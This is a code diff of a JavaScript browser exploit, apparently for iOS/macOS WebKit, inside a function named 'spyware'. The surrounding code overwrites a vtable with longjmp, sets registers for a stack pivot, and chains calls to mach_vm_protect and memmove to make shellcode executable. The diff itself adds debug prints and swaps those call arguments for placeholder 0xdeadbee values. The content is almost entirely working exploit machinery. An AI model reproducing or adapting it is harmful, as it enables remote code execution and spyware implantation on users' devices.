@@ -111,7 +111,7 @@ function _readInt64(addr)
 
 function _writeInt64(i, val)
 {
-    if(i instanceof Int64) i = i.lo();
+    if (i instanceof Int64) i = i.lo();
     this.set(val.bytes(), i);
 }
 
@@ -461,6 +461,7 @@ function spyware(stage1, memory, binary)
         fail("genesis");
     }
     var jmpAddr = Add(psyms["genesis"], shslide);
+    print(`finna jmp ${hexit(jmpAddr)}`)
 
     memory.writeInt64(Add(vtab, 0x18), longjmp);
     memory.writeInt64(Add(el_addr, 0x58), stackloader);        // x30 (gadget)
@@ -673,17 +674,24 @@ function spyware(stage1, memory, binary)
     );
 
     add_call(mach_vm_protect,
-        mach_task_self_,    // task
-        codeAddr,           // addr
-        shsz,               // size
+        // mach_task_self_,    // task
+        // codeAddr,           // addr
+        // shsz,               // size
+        new Int64(0xdeadbee0),
+        new Int64(0xdeadbee1),
+        new Int64(0xdeadbee3),
         new Int64(0),       // max flag
-        new Int64(7)        // prot
+        new Int64(7),       // prot,
+        0
     );
 
     add_call(memmove,
-        codeAddr,           // dst
-        paddr,              // src
-        shsz                // size
+        // codeAddr,           // dst
+        // paddr,              // src
+        // shsz                // size
+        new Int64(0xdeadbee4),
+        new Int64(0xdeadbee5),
+        new Int64(0xdeadbee6)
     );
 
     add_call(usleep,
@@ -702,6 +710,7 @@ function spyware(stage1, memory, binary)
     memory.writeInt64(Add(el_addr, 0x68), sp);      // x2 (copied into sp)
 
     // trigger
+    print("u rdy?")
     wrapper.addEventListener("click", function(){});
 
     print("should never reach this");
